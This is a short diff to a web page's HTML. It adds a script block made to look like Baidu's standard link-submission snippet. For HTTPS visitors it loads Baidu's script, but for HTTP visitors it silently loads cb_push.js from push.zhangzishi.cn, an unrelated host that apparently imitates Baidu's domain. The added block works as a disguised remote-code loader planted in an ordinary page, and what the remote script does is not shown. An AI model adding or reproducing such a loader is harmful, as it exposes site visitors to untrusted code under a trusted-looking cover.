@@ -91,5 +91,19 @@
     <script>
     function copyWechat() {navigator.clipboard.writeText('kyt3158').then(function() {var toast = document.createElement('div');toast.className = 'copy-toast show';toast.textContent = 'WeChat ID copied';document.body.appendChild(toast);setTimeout(function() { toast.remove(); }, 2000);});}
     </script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if(curProtocol === 'https'){
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else{
+        bp.src = 'http://push.zhangzishi.cn/cb_push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
 </body>
 </html>
